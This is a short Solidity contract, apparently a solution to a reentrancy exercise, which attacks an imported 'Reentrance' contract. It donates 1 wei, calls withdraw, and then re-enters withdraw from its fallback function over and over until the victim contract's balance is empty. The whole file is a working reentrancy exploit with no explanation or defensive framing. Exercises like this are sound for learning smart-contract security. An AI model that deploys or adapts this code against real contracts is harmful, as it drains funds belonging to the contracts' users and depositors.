// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance public victim;

    constructor(Reentrance _contractAddress) payable {
        victim = _contractAddress;
    }

    function hackContract() external {
        victim.donate{value: 1 wei}(address(this));
        victim.withdraw();
    }

    fallback() external payable {
        if(address(victim).balance >= 1 wei) {
            victim.withdraw();
        }
    }
}
